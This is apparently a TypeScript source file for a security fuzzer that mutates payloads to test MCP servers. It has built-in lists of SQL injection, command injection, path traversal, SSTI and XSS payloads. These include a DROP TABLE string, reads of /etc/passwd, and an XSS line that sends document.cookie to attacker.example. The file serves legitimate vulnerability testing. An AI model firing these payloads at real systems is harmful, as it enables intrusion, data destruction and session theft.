/**
 * Copyright (c) 2026 FinkTech
 *
 * This file is part of MCP Verify.
 * Licensed under the GNU Affero General Public License v3.0 (AGPL-3.0).
 * See LICENSE file in the project root for full license information.
 */
/**
 * Fuzzer Engine — v1.0 "Smart Fuzzer"
 *
 * Feedback-driven fuzzing engine that learns from server responses
 * in real time and dynamically expands its attack surface.
 *
 * New in v1.0:
 *   - Response analysis with interest scoring (crash, timing anomaly, structural drift)
 *   - MutationEngine that generates targeted variations of interesting payloads
 *   - Dynamic payload queue: mutations are injected mid-session at high priority
 *   - Baseline calibration phase before the main fuzzing loop
 *   - All additions preserve the existing PromisePool + event architecture
 */

import type {
  IPayloadGenerator,
  GeneratedPayload,
  GeneratorConfig,
} from "../generators/generator.interface";
import type {
  IVulnerabilityDetector,
  DetectorContext,
  DetectionResult,
} from "../detectors/detector.interface";
import { Fingerprinter } from "../fingerprint";
import type { ServerFingerprint, FingerprintConfig } from "../fingerprint";

// ---------------------------------------------------------------------------
// Existing public interfaces (unchanged for backwards compatibility)
// ---------------------------------------------------------------------------

export interface FuzzerEngineConfig {
  generators: IPayloadGenerator[];
  detectors: IVulnerabilityDetector[];
  generatorConfig?: GeneratorConfig;
  timeout?: number;
  delayBetweenRequests?: number;
  concurrency?: number;
  stopOnFirstVulnerability?: boolean;
  onProgress?: (progress: FuzzingProgress) => void;
  onVulnerability?: (
    detection: DetectionResult,
    payload: GeneratedPayload,
  ) => void;
  enableFingerprinting?: boolean;
  fingerprintConfig?: FingerprintConfig;
  onFingerprint?: (fingerprint: ServerFingerprint) => void;

  // === NEW in v1.0 ===
  /** Enable the feedback loop (default: true) */
  enableFeedbackLoop?: boolean;
  /**
   * Absolute response-time threshold in ms that triggers a timing anomaly.
   * Default: 2000ms (covers Blind SQLi sleep(), ReDoS catastrophic backtracking).
   */
  timingAnomalyThresholdMs?: number;
  /**
   * Multiplier over the rolling average that also triggers a timing anomaly.
   * Default: 2.0  (response took >2× the average → suspicious)
   */
  timingAnomalyMultiplier?: number;
  /**
   * Structural drift threshold: ratio of response-size change that marks
   * a response as "interesting" (0.0–1.0, default 0.5 = 50% size change).
   */
  structuralDriftThreshold?: number;
  /** Max number of mutation rounds per interesting payload (default: 2) */
  maxMutationRounds?: number;
  /** Callback when an interesting (non-vulnerability) response is found */
  onInterestingResponse?: (
    analysis: ResponseAnalysis,
    payload: GeneratedPayload,
  ) => void;
}

export interface FuzzingProgress {
  current: number;
  total: number;
  percentage: number;
  payload?: GeneratedPayload;
  vulnerabilitiesFound: number;
  errorsEncountered: number;
  // NEW: dynamic queue state
  mutationsQueued: number;
  mutationRound: number;
}

export interface FuzzingError {
  payload: GeneratedPayload;
  message: string;
  stack?: string;
  code?: string;
  timestamp: Date;
}

export interface FuzzingSession {
  id: string;
  startedAt: Date;
  endedAt?: Date;
  totalPayloads: number;
  payloadsExecuted: number;
  vulnerabilities: DetectionResult[];
  payloadsByCategory: Record<string, number>;
  errors: FuzzingError[];
  aborted: boolean;
  abortReason?: string;
  fingerprint?: ServerFingerprint;
  disabledGenerators?: string[];
  // NEW: feedback-loop telemetry
  feedbackStats: FeedbackStats;
}

export interface FuzzTarget {
  execute(payload: GeneratedPayload): Promise<{
    response: unknown;
    responseTimeMs: number;
    isError: boolean;
    error?: { code: number; message: string };
  }>;
}

// ---------------------------------------------------------------------------
// NEW in v1.0 — Feedback loop types
// ---------------------------------------------------------------------------

/** Interest level returned by analyzeResponse. */
export type InterestLevel = "not_interesting" | "interesting" | "high_priority";

/** Reason why a response was flagged as interesting. */
export type InterestReason =
  | "server_crash" // HTTP 500 or MCP error code indicating internal failure
  | "timing_anomaly" // Response took >2× average or >threshold ms
  | "structural_drift" // Response body size changed drastically
  | "error_pattern_match" // Error message contains vulnerability indicators
  | "empty_response"; // Server returned nothing (possible crash/hang)

export interface ResponseAnalysis {
  /** Computed interest level */
  interestLevel: InterestLevel;
  /** All reasons this response was flagged */
  reasons: InterestReason[];
  /** Response time for this execution */
  responseTimeMs: number;
  /** Current rolling average response time */
  averageResponseTimeMs: number;
  /** Size of the serialised response in bytes */
  responseSizeBytes: number;
  /** Baseline response size for comparison */
  baselineSizeBytes: number;
  /** The payload that produced this response */
  payload: GeneratedPayload;
}

/** Aggregate statistics about the feedback loop for reporting. */
export interface FeedbackStats {
  /** Total responses flagged as interesting or high-priority */
  interestingResponsesFound: number;
  /** Total mutation payloads injected into the queue */
  mutationsInjected: number;
  /** How many mutation rounds completed */
  mutationRoundsCompleted: number;
  /** Number of responses that triggered timing anomaly detection */
  timingAnomaliesDetected: number;
  /** Number of responses that triggered structural drift detection */
  structuralDriftDetected: number;
  /** Number of server crashes detected */
  serverCrashesDetected: number;
}

// ---------------------------------------------------------------------------
// MutationEngine
// ---------------------------------------------------------------------------

/**
 * Strategy interface for mutation providers.
 * Add custom strategies by implementing this interface.
 */
export interface IMutationStrategy {
  readonly id: string;
  readonly name: string;
  mutate(payload: GeneratedPayload): GeneratedPayload[];
}

// ---------------------------------------------------------------------------
// Payload category constants
// Centralises all category strings — eliminates magic strings across the engine.
// ---------------------------------------------------------------------------

/**
 * Canonical payload category identifiers.
 * Generator implementations MUST use these values in `GeneratedPayload.category`
 * so the MutationEngine can route decisions correctly.
 */
export const PayloadCategory = {
  SQLI: "sqli",
  XSS: "xss",
  CMD_INJECTION: "cmd-injection",
  PATH_TRAVERSAL: "path-traversal",
  PROMPT_INJ: "prompt-injection",
  JSON_RPC: "json-rpc",
  SCHEMA_CONF: "schema-confusion",
  PROTO_FUZZ: "protocol-fuzz",
  REDOS: "redos",
  SSTI: "ssti", // Server-Side Template Injection
  XXE: "xxe",
  SSRF: "ssrf",
} as const;

export type PayloadCategoryValue =
  (typeof PayloadCategory)[keyof typeof PayloadCategory];

// ---------------------------------------------------------------------------
// Strategy selection rule types
// Used internally by MutationEngine to build the decision matrix.
// ---------------------------------------------------------------------------

/**
 * A single row in the strategy selection matrix.
 * The engine evaluates every registered rule and collects the union of all
 * matching strategy IDs, deduplicating before returning.
 */
interface SelectionRule {
  /** Human-readable label for debugging / telemetry */
  readonly label: string;
  /** Returns true when this rule should fire */
  readonly matches: (
    category: string,
    reasons: ReadonlyArray<InterestReason>,
  ) => boolean;
  /** IDs of the strategies to include when this rule fires */
  readonly strategyIds: ReadonlyArray<string>;
  /**
   * Priority tier — higher number = more important.
   * When two rules both match and recommend different strategies, higher-priority
   * rules dominate when `exclusive` is true.
   */
  readonly priority: number;
  /**
   * If true, only rules at this priority level (or higher) are considered once
   * this rule fires. Used to prevent low-value generic strategies from running
   * alongside highly targeted ones.
   */
  readonly exclusive?: boolean;
}

// ---------------------------------------------------------------------------
// Timing-probe category helpers
// ---------------------------------------------------------------------------

/**
 * Categories whose payloads are inherently time-based (already probe timing).
 * A timing anomaly on these does NOT require cross-confirmation because the
 * payload was already designed to measure delays.
 */
const INHERENTLY_TIMED_CATEGORIES = new Set<string>([
  PayloadCategory.SQLI,
  PayloadCategory.CMD_INJECTION,
  PayloadCategory.REDOS,
]);

/**
 * Returns true when a timing anomaly occurred on a payload that was NOT
 * designed to measure timing — i.e. a cross-confirmation opportunity.
 *
 * Example: a bare single-quote `'` caused a 3-second delay → the app is
 * likely vulnerable to Blind SQLi but the timing was a side-effect, not
 * the intent. We must now fire an explicit timing probe to confirm.
 */
function needsCrossConfirmation(
  category: string,
  reasons: ReadonlyArray<InterestReason>,
): boolean {
  return (
    reasons.includes("timing_anomaly") &&
    !INHERENTLY_TIMED_CATEGORIES.has(category)
  );
}

// ---------------------------------------------------------------------------
// MutationEngine — v2.1 "Vulnerability-Aware"
// ---------------------------------------------------------------------------

/**
 * MutationEngine
 *
 * Produces targeted payload variations based on THREE axes:
 *   1. **Payload category** — what vulnerability class was being probed?
 *   2. **Anomaly signal**   — what did the server's response reveal?
 *   3. **Cross-confirmation** — does the combination suggest a hidden vuln class?
 *
 * Decision logic lives in a declarative `SelectionRule[]` matrix rather than
 * nested if/else blocks, making it trivial to add new rules without touching
 * existing logic.
 *
 * Built-in strategies:
 *   sql-depth       — stacked queries, UNION selects, comment terminators
 *   null-byte       — %00 / \0 insertion (path traversal, filter bypass)
 *   buffer-stress   — length amplification (overflow, ReDoS, DoS)
 *   quote-variation — quote wrapping/appending (SQLi syntax repair)
 *   bit-flip        — single-character corruption (parser edge cases)
 *   unicode-norm    — lookalike substitutions (WAF / filter bypass)
 *   truncation      — progressive shortening (off-by-one, boundary bugs)
 *   timing-probe    — explicit sleep payloads (Blind SQLi confirmation)
 *   cmd-separator   — shell separator variants (command injection depth)
 *   xss-escalation  — DOM sinks, event handlers (XSS confirmation)
 *   path-traversal  — ../ variants and encoding (LFI/RFI depth)
 *   ssti-probe      — template engine probes (SSTI confirmation)
 */
export class MutationEngine {
  private readonly strategyMap: ReadonlyMap<string, IMutationStrategy>;

  /** Declarative selection matrix — evaluated top-to-bottom. */
  private readonly rules: ReadonlyArray<SelectionRule> = [
    // ── Tier 3: Cross-confirmation (highest priority, exclusive) ───────────
    // Fires when a timing anomaly occurs on a NON-timing payload.
    // This is the most actionable signal: the category was wrong, confirm blind vuln.
    {
      label: "cross-confirm: timing anomaly on non-timed payload",
      priority: 3,
      exclusive: true,
      matches: (cat, reasons) => needsCrossConfirmation(cat, reasons),
      strategyIds: ["timing-probe", "sql-depth", "quote-variation"],
    },

    // ── Tier 2: Category × Signal combinations (high specificity) ──────────

    // SQLi + timing → blind injection confirmation
    {
      label: "sqli + timing_anomaly → blind sqli depth",
      priority: 2,
      exclusive: true,
      matches: (cat, reasons) =>
        cat === PayloadCategory.SQLI && reasons.includes("timing_anomaly"),
      strategyIds: ["timing-probe", "sql-depth"],
    },

    // SQLi + error leaked → syntax repair to fully exploit
    {
      label: "sqli + error_pattern_match → syntax repair",
      priority: 2,
      exclusive: true,
      matches: (cat, reasons) =>
        cat === PayloadCategory.SQLI && reasons.includes("error_pattern_match"),
      strategyIds: ["quote-variation", "sql-depth"],
    },

    // SQLi + structural drift → UNION-based extraction attempt
    {
      label: "sqli + structural_drift → union extraction",
      priority: 2,
      exclusive: true,
      matches: (cat, reasons) =>
        cat === PayloadCategory.SQLI && reasons.includes("structural_drift"),
      strategyIds: ["sql-depth", "quote-variation", "unicode-norm"],
    },

    // SQLi + crash → stress the broken query parser
    {
      label: "sqli + server_crash → parser stress",
      priority: 2,
      exclusive: true,
      matches: (cat, reasons) =>
        cat === PayloadCategory.SQLI && reasons.includes("server_crash"),
      strategyIds: ["buffer-stress", "truncation", "quote-variation"],
    },

    // Command injection + timing → shell sleep confirmation
    {
      label: "cmd-injection + timing_anomaly → shell timing probes",
      priority: 2,
      exclusive: true,
      matches: (cat, reasons) =>
        cat === PayloadCategory.CMD_INJECTION &&
        reasons.includes("timing_anomaly"),
      strategyIds: ["timing-probe", "cmd-separator"],
    },

    // Command injection + crash/drift → deepen separator search
    {
      label: "cmd-injection + crash|drift → separator depth",
      priority: 2,
      exclusive: true,
      matches: (cat, reasons) =>
        cat === PayloadCategory.CMD_INJECTION &&
        (reasons.includes("server_crash") ||
          reasons.includes("structural_drift")),
      strategyIds: ["cmd-separator", "null-byte", "truncation"],
    },

    // XSS + error leaked → WAF bypass via encoding
    {
      label: "xss + error_pattern_match → encoding bypass",
      priority: 2,
      exclusive: true,
      matches: (cat, reasons) =>
        cat === PayloadCategory.XSS && reasons.includes("error_pattern_match"),
      strategyIds: ["xss-escalation", "unicode-norm"],
    },

    // XSS + structural drift → DOM sink confirmation
    {
      label: "xss + structural_drift → dom sink escalation",
      priority: 2,
      exclusive: true,
      matches: (cat, reasons) =>
        cat === PayloadCategory.XSS && reasons.includes("structural_drift"),
      strategyIds: ["xss-escalation", "unicode-norm", "quote-variation"],
    },

    // Path traversal + any signal → encoding variants + null-byte
    {
      label: "path-traversal + any signal → traversal depth",
      priority: 2,
      exclusive: true,
      matches: (cat, _reasons) => cat === PayloadCategory.PATH_TRAVERSAL,
      strategyIds: ["path-traversal-depth", "null-byte", "unicode-norm"],
    },

    // SSTI + any signal → template engine probe escalation
    {
      label: "ssti + any signal → template depth",
      priority: 2,
      exclusive: true,
      matches: (cat, _reasons) => cat === PayloadCategory.SSTI,
      strategyIds: ["ssti-probe", "unicode-norm", "quote-variation"],
    },

    // ReDoS + timing → amplify the catastrophic backtracking pattern
    {
      label: "redos + timing_anomaly → backtracking amplification",
      priority: 2,
      exclusive: true,
      matches: (cat, reasons) =>
        cat === PayloadCategory.REDOS && reasons.includes("timing_anomaly"),
      strategyIds: ["buffer-stress", "truncation"],
    },

    // ── Tier 1: Signal-only fallbacks (no category match above) ────────────

    // Any category: error leaked → always try syntax repair first
    {
      label: "any + error_pattern_match → quote repair",
      priority: 1,
      matches: (_cat, reasons) => reasons.includes("error_pattern_match"),
      strategyIds: ["quote-variation", "sql-depth"],
    },

    // Any category: crash → structural stress test
    {
      label: "any + server_crash → structural stress",
      priority: 1,
      matches: (_cat, reasons) => reasons.includes("server_crash"),
      strategyIds: ["buffer-stress", "null-byte", "truncation", "bit-flip"],
    },

    // Any category: drift → injection exploration
    {
      label: "any + structural_drift → injection exploration",
      priority: 1,
      matches: (_cat, reasons) => reasons.includes("structural_drift"),
      strategyIds: ["quote-variation", "unicode-norm", "null-byte"],
    },

    // Any category: empty response → crash/hang probing
    {
      label: "any + empty_response → hang probing",
      priority: 1,
      matches: (_cat, reasons) => reasons.includes("empty_response"),
      strategyIds: ["timing-probe", "buffer-stress", "truncation"],
    },

    // ── Tier 0: Catch-all (lowest priority, never exclusive) ───────────────
    {
      label: "catch-all: unknown interesting response",
      priority: 0,
      matches: (_cat, _reasons) => true,
      strategyIds: [
        "quote-variation",
        "null-byte",
        "truncation",
        "bit-flip",
        "unicode-norm",
      ],
    },
  ];

  constructor(customStrategies?: IMutationStrategy[]) {
    const builtIn: IMutationStrategy[] = [
      new SqlInjectionDepthStrategy(),
      new NullByteInsertionStrategy(),
      new BufferStressStrategy(),
      new QuoteVariationStrategy(),
      new BitFlipStrategy(),
      new UnicodeNormalisationStrategy(),
      new TruncationStrategy(),
      new TimingProbeStrategy(),
      new CmdSeparatorStrategy(),
      new XssEscalationStrategy(),
      new PathTraversalDepthStrategy(),
      new SstiProbeStrategy(),
      ...(customStrategies ?? []),
    ];

    this.strategyMap = new Map(builtIn.map((s) => [s.id, s]));
  }

  /**
   * Generate mutations for an interesting payload.
   *
   * The selection matrix is evaluated to find all matching rules.
   * If any exclusive rule fires at the highest matching priority, only rules
   * at that priority level are used — preventing low-value generic mutations
   * from diluting a highly targeted attack sequence.
   */
  mutate(
    payload: GeneratedPayload,
    reasons: InterestReason[],
    round: number,
  ): GeneratedPayload[] {
    const selected = this.selectStrategies(payload.category, reasons);
    const mutations: GeneratedPayload[] = [];

    for (const strategy of selected) {
      const variants = strategy.mutate(payload);
      mutations.push(
        ...variants.map((v) => ({
          ...v,
          metadata: {
            ...v.metadata,
            isMutation: true,
            mutationRound: round,
            mutationStrategy: strategy.id,
            selectionReasons: reasons.slice(),
            originalCategory: payload.category,
            originalPayload:
              typeof payload.value === "string"
                ? payload.value.slice(0, 100)
                : JSON.stringify(payload.value).slice(0, 100),
          },
        })),
      );
    }

    return mutations;
  }

  /**
   * Evaluate the selection matrix and return the resolved strategy set.
   *
   * Algorithm:
   *   1. Evaluate every rule against (category, reasons).
   *   2. Find the highest priority among matching rules.
   *   3. If any matching rule at that priority is `exclusive`, collect only
   *      strategy IDs from rules at that priority level.
   *   4. Otherwise, collect the union of IDs from ALL matching rules.
   *   5. Resolve IDs → strategy instances (unknown IDs are silently skipped).
   *   6. Emit a telemetry-friendly selection record for debugging.
   */
  private selectStrategies(
    category: string,
    reasons: ReadonlyArray<InterestReason>,
  ): IMutationStrategy[] {
    const matchingRules = this.rules.filter((r) =>
      r.matches(category, reasons),
    );

    if (matchingRules.length === 0) {
      // Should never happen because the catch-all always matches, but be safe
      return [...this.strategyMap.values()];
    }

    const maxPriority = Math.max(...matchingRules.map((r) => r.priority));
    const topRules = matchingRules.filter((r) => r.priority === maxPriority);
    const hasExclusive = topRules.some((r) => r.exclusive === true);

    // Collect strategy IDs from the appropriate rule set
    const sourceRules = hasExclusive
      ? topRules // exclusive mode: only top-priority rules
      : matchingRules; // inclusive mode: union of all matching rules

    const selectedIds = new Set<string>(
      sourceRules.flatMap((r) => r.strategyIds),
    );

    // Resolve IDs to strategy instances
    const strategies: IMutationStrategy[] = [];
    for (const id of selectedIds) {
      const strategy = this.strategyMap.get(id);
      if (strategy) {
        strategies.push(strategy);
      }
      // Unknown IDs are silently skipped — allows custom strategy IDs referenced
      // in rules to be optional (e.g. disabled in a minimal build)
    }

    return strategies;
  }
}

// ---------------------------------------------------------------------------
// Built-in mutation strategy implementations
// ---------------------------------------------------------------------------

/** Helper: coerce payload value to string for string-based mutations. */
function payloadToString(payload: GeneratedPayload): string {
  return typeof payload.value === "string"
    ? payload.value
    : JSON.stringify(payload.value);
}

/** Helper: clone a payload with a new value and updated description. */
function cloneWith(
  base: GeneratedPayload,
  value: string,
  descSuffix: string,
): GeneratedPayload {
  return {
    ...base,
    value,
    description: `${base.description} [mutation: ${descSuffix}]`,
    type: `${base.type}_mutation`,
  };
}

class SqlInjectionDepthStrategy implements IMutationStrategy {
  readonly id = "sql-depth";
  readonly name = "SQL Injection Depth";

  mutate(payload: GeneratedPayload): GeneratedPayload[] {
    const base = payloadToString(payload);
    const suffixes = [
      "' OR '1'='1",
      "'; DROP TABLE users; --",
      "' UNION SELECT NULL,NULL,NULL--",
      "' AND SLEEP(5)--",
      "'; WAITFOR DELAY '0:0:5'--",
    ];
    return suffixes.map((s, i) =>
      cloneWith(payload, base + s, `sql-suffix-${i}`),
    );
  }
}

class NullByteInsertionStrategy implements IMutationStrategy {
  readonly id = "null-byte";
  readonly name = "Null Byte Insertion";

  mutate(payload: GeneratedPayload): GeneratedPayload[] {
    const base = payloadToString(payload);
    const mid = Math.floor(base.length / 2);
    return [
      cloneWith(payload, base + "%00", "null-suffix"),
      cloneWith(payload, "%00" + base, "null-prefix"),
      cloneWith(
        payload,
        base.slice(0, mid) + "%00" + base.slice(mid),
        "null-mid",
      ),
      cloneWith(payload, base + "\x00", "null-raw-suffix"),
    ];
  }
}

class BufferStressStrategy implements IMutationStrategy {
  readonly id = "buffer-stress";
  readonly name = "Buffer Stress";

  mutate(payload: GeneratedPayload): GeneratedPayload[] {
    const base = payloadToString(payload);
    return [
      cloneWith(payload, base.repeat(10), "repeat-10"),
      cloneWith(payload, base.repeat(100), "repeat-100"),
      cloneWith(payload, "A".repeat(1024), "long-a-1k"),
      cloneWith(payload, "A".repeat(65536), "long-a-64k"),
      cloneWith(payload, base + "A".repeat(1024), "padded-1k"),
    ];
  }
}

class QuoteVariationStrategy implements IMutationStrategy {
  readonly id = "quote-variation";
  readonly name = "Quote Variation";

  mutate(payload: GeneratedPayload): GeneratedPayload[] {
    const base = payloadToString(payload);
    return [
      cloneWith(payload, `'${base}'`, "single-wrapped"),
      cloneWith(payload, `"${base}"`, "double-wrapped"),
      cloneWith(payload, `\`${base}\``, "backtick-wrapped"),
      cloneWith(payload, base + "'", "single-append"),
      cloneWith(payload, base + '"', "double-append"),
      cloneWith(payload, base + "\\", "backslash-append"),
    ];
  }
}

class BitFlipStrategy implements IMutationStrategy {
  readonly id = "bit-flip";
  readonly name = "Bit Flip";

  mutate(payload: GeneratedPayload): GeneratedPayload[] {
    const base = payloadToString(payload);
    const results: GeneratedPayload[] = [];
    // Flip first, middle, and last characters
    const positions = [0, Math.floor(base.length / 2), base.length - 1].filter(
      (p) => p >= 0 && p < base.length,
    );
    for (const pos of positions) {
      const flipped =
        base.slice(0, pos) +
        String.fromCharCode(base.charCodeAt(pos) ^ 0x01) +
        base.slice(pos + 1);
      results.push(cloneWith(payload, flipped, `bit-flip-pos-${pos}`));
    }
    return results;
  }
}

class UnicodeNormalisationStrategy implements IMutationStrategy {
  readonly id = "unicode-norm";
  readonly name = "Unicode Normalisation";

  // Lookalike substitutions that bypass naive string-match filters
  private readonly substitutions: Array<[string, string]> = [
    ["<", "\uFE64"], // ﹤ SMALL LESS-THAN SIGN
    [">", "\uFE65"], // ﹥ SMALL GREATER-THAN SIGN
    ["'", "\u2019"], // ' RIGHT SINGLE QUOTATION MARK
    ['"', "\u201D"], // " RIGHT DOUBLE QUOTATION MARK
    ["/", "\u2215"], // ∕ DIVISION SLASH
    [".", "\uFF0E"], // ． FULLWIDTH FULL STOP
  ];

  mutate(payload: GeneratedPayload): GeneratedPayload[] {
    const base = payloadToString(payload);
    const results: GeneratedPayload[] = [];

    for (const [original, lookalike] of this.substitutions) {
      if (base.includes(original)) {
        results.push(
          cloneWith(
            payload,
            base.split(original).join(lookalike),
            `unicode-${original.charCodeAt(0).toString(16)}`,
          ),
        );
      }
    }

    // Also add an overlong UTF-8 encoded slash (classic path traversal bypass)
    results.push(
      cloneWith(payload, base.replace(/\//g, "%c0%af"), "overlong-slash"),
    );

    return results;
  }
}

class TruncationStrategy implements IMutationStrategy {
  readonly id = "truncation";
  readonly name = "Truncation";

  mutate(payload: GeneratedPayload): GeneratedPayload[] {
    const base = payloadToString(payload);
    const results: GeneratedPayload[] = [];

    // Progressive truncation: 75%, 50%, 25%, single char
    for (const fraction of [0.75, 0.5, 0.25]) {
      const len = Math.max(1, Math.floor(base.length * fraction));
      results.push(
        cloneWith(
          payload,
          base.slice(0, len),
          `trunc-${Math.round(fraction * 100)}pct`,
        ),
      );
    }

    // One byte over a common boundary
    for (const boundary of [127, 255, 1023, 65535]) {
      if (base.length < boundary + 2) continue;
      results.push(
        cloneWith(
          payload,
          base.slice(0, boundary + 1),
          `trunc-boundary-${boundary}`,
        ),
      );
    }

    return results;
  }
}

class TimingProbeStrategy implements IMutationStrategy {
  readonly id = "timing-probe";
  readonly name = "Timing Probe";

  // Classic sleep payloads for different backends
  private readonly probes = [
    "' AND SLEEP(5)-- -",
    "'; WAITFOR DELAY '0:0:5'--",
    "1; SELECT pg_sleep(5)--",
    "$(sleep 5)",
    "`sleep 5`",
    "| timeout /T 5",
    "'; import time; time.sleep(5); '",
  ];

  mutate(payload: GeneratedPayload): GeneratedPayload[] {
    const base = payloadToString(payload);
    return this.probes.map((probe, i) =>
      cloneWith(payload, base + probe, `timing-probe-${i}`),
    );
  }
}

class CmdSeparatorStrategy implements IMutationStrategy {
  readonly id = "cmd-separator";
  readonly name = "Command Separator Depth";

  private readonly separators = [
    "; sleep 5",
    "| sleep 5",
    "|| sleep 5",
    "&& sleep 5",
    "& timeout /T 5",
    "\n sleep 5",
    "\r\n sleep 5",
    "`sleep 5`",
    "$(sleep 5)",
    "; ping -c 5 127.0.0.1",
    "| ping -n 5 127.0.0.1",
    "; cat /etc/passwd",
    "& type C:\\Windows\\win.ini",
  ];

  mutate(payload: GeneratedPayload): GeneratedPayload[] {
    const base = payloadToString(payload);
    return this.separators.map((sep, i) =>
      cloneWith(payload, base + sep, `cmd-sep-${i}`),
    );
  }
}

class XssEscalationStrategy implements IMutationStrategy {
  readonly id = "xss-escalation";
  readonly name = "XSS Escalation";

  private readonly escalations = [
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    '"><script>alert(1)</script>',
    "';alert(1)//",
    "{{7*7}}",
    '<iframe src="javascript:alert(1)">',
    "<details open ontoggle=alert(1)>",
    "javascript:alert(1)",
    "<body onpageshow=alert(1)>",
    '"><img src=/ onerror=fetch(`//attacker.example?c=`+document.cookie)>',
  ];

  mutate(payload: GeneratedPayload): GeneratedPayload[] {
    const base = payloadToString(payload);
    return this.escalations.map((esc, i) =>
      cloneWith(payload, base + esc, `xss-esc-${i}`),
    );
  }
}

class PathTraversalDepthStrategy implements IMutationStrategy {
  readonly id = "path-traversal-depth";
  readonly name = "Path Traversal Depth";

  private readonly sequences = [
    "../../../etc/passwd",
    "..\\..\\..\\Windows\\win.ini",
    "....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252fetc%252fpasswd",
    "%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
    "../../../etc/passwd%00.jpg",
    "/etc/passwd",
    "C:\\Windows\\win.ini",
    "../../../proc/self/environ",
    "../../../var/log/apache2/access.log",
  ];

  mutate(payload: GeneratedPayload): GeneratedPayload[] {
    const base = payloadToString(payload);
    return this.sequences.map((seq, i) =>
      cloneWith(payload, base + seq, `path-trav-${i}`),
    );
  }
}

class SstiProbeStrategy implements IMutationStrategy {
  readonly id = "ssti-probe";
  readonly name = "SSTI Probe";

  private readonly probes = [
    "{{7*7}}",
    "${7*7}",
    "#{7*7}",
    "<%= 7*7 %>",
    '{{7*"7"}}',
    '${"freemarker".toUpperCase()}',
    "{{config}}",
    "{{self.__dict__}}",
    "*{7*7}",
    "@{7*7}",
  ];

  mutate(payload: GeneratedPayload): GeneratedPayload[] {
    const base = payloadToString(payload);
    return this.probes.map((probe, i) =>
      cloneWith(payload, base + probe, `ssti-${i}`),
    );
  }
}

// ---------------------------------------------------------------------------
// DynamicPayloadQueue
// ---------------------------------------------------------------------------

/**
 * A priority-aware queue that supports two tiers:
 *   HIGH  — mutation payloads derived from interesting responses (processed first)
 *   NORMAL — initial payloads from generators
 *
 * The queue is designed so the main fuzz loop can atomically dequeue one
 * payload at a time, while the feedback handler injects new high-priority
 * items concurrently.
 */
class DynamicPayloadQueue {
  private high: GeneratedPayload[] = [];
  private normal: GeneratedPayload[] = [];
  private _totalEnqueued = 0;

  enqueueNormal(payloads: GeneratedPayload[]): void {
    this.normal.push(...payloads);
    this._totalEnqueued += payloads.length;
  }

  enqueueHigh(payloads: GeneratedPayload[]): void {
    this.high.push(...payloads);
    this._totalEnqueued += payloads.length;
  }

  dequeue(): GeneratedPayload | undefined {
    // High-priority items drain first
    return this.high.shift() ?? this.normal.shift();
  }

  get size(): number {
    return this.high.length + this.normal.length;
  }

  get totalEnqueued(): number {
    return this._totalEnqueued;
  }

  get highSize(): number {
    return this.high.length;
  }

  isEmpty(): boolean {
    return this.high.length === 0 && this.normal.length === 0;
  }
}

// ---------------------------------------------------------------------------
// PromisePool (unchanged from v1, kept local to preserve file self-sufficiency)
// ---------------------------------------------------------------------------

class PromisePool<T, R> {
  private concurrency: number;
  private running = 0;

  constructor(concurrency: number) {
    this.concurrency = Math.max(1, concurrency);
  }

  async run(
    items: T[],
    executor: (item: T, index: number) => Promise<R>,
    options?: {
      onResult?: (result: R, item: T, index: number) => void;
      onError?: (error: Error, item: T, index: number) => void;
      shouldAbort?: () => boolean;
    },
  ): Promise<void> {
    const { onResult, onError, shouldAbort } = options ?? {};

    return new Promise((resolve) => {
      let completed = 0;
      let index = 0;

      const next = () => {
        if (shouldAbort?.()) {
          if (this.running === 0) resolve();
          return;
        }

        while (this.running < this.concurrency && index < items.length) {
          const currentIndex = index;
          const item = items[currentIndex];
          index++;
          this.running++;

          executor(item, currentIndex)
            .then((result) => {
              onResult?.(result, item, currentIndex);
            })
            .catch((err) => {
              onError?.(
                err instanceof Error ? err : new Error(String(err)),
                item,
                currentIndex,
              );
            })
            .finally(() => {
              this.running--;
              completed++;
              if (
                completed === items.length ||
                (shouldAbort?.() && this.running === 0)
              ) {
                resolve();
              } else {
                next();
              }
            });
        }
      };

      if (items.length === 0) resolve();
      else next();
    });
  }
}

// ---------------------------------------------------------------------------
// ResponseBaseline — rolling statistics for anomaly detection
// ---------------------------------------------------------------------------

class ResponseBaseline {
  private responseTimes: number[] = [];
  private responseSizes: number[] = [];

  /** Number of clean baseline samples to collect before anomaly detection activates. */
  private readonly WARMUP_SAMPLES = 5;

  record(responseTimeMs: number, responseSizeBytes: number): void {
    this.responseTimes.push(responseTimeMs);
    this.responseSizes.push(responseSizeBytes);
    // Keep a rolling window to avoid memory growth in long sessions
    if (this.responseTimes.length > 200) this.responseTimes.shift();
    if (this.responseSizes.length > 200) this.responseSizes.shift();
  }

  get averageTimeMs(): number {
    if (this.responseTimes.length === 0) return 0;
    return (
      this.responseTimes.reduce((a, b) => a + b, 0) / this.responseTimes.length
    );
  }

  get averageSizeBytes(): number {
    if (this.responseSizes.length === 0) return 0;
    return (
      this.responseSizes.reduce((a, b) => a + b, 0) / this.responseSizes.length
    );
  }

  get isWarmedUp(): boolean {
    return this.responseTimes.length >= this.WARMUP_SAMPLES;
  }
}

// ---------------------------------------------------------------------------
// FuzzerEngine v1.0
// ---------------------------------------------------------------------------

export class FuzzerEngine {
  private config: Required<
    Omit<
      FuzzerEngineConfig,
      | "generatorConfig"
      | "onProgress"
      | "onVulnerability"
      | "fingerprintConfig"
      | "onFingerprint"
      | "onInterestingResponse"
    >
  > &
    Pick<
      FuzzerEngineConfig,
      | "generatorConfig"
      | "onProgress"
      | "onVulnerability"
      | "fingerprintConfig"
      | "onFingerprint"
      | "onInterestingResponse"
    >;

  private session: FuzzingSession | null = null;
  private abortController: AbortController | null = null;
  private fingerprinter: Fingerprinter;
  private lastFingerprint: ServerFingerprint | null = null;

  // v1.0 — Smart Fuzzer state
  private mutationEngine: MutationEngine;
  private baseline: ResponseBaseline;
  private mutationRound = 0;

  constructor(config: FuzzerEngineConfig) {
    this.config = {
      timeout: 5_000,
      delayBetweenRequests: 100,
      concurrency: 1,
      stopOnFirstVulnerability: false,
      enableFingerprinting: false,
      enableFeedbackLoop: true,
      timingAnomalyThresholdMs: 2_000,
      timingAnomalyMultiplier: 2.0,
      structuralDriftThreshold: 0.5,
      maxMutationRounds: 2,
      ...config,
    };

    this.fingerprinter = new Fingerprinter(config.fingerprintConfig);
    this.mutationEngine = new MutationEngine();
    this.baseline = new ResponseBaseline();
  }

  // -------------------------------------------------------------------------
  // Public API (unchanged signatures)
  // -------------------------------------------------------------------------

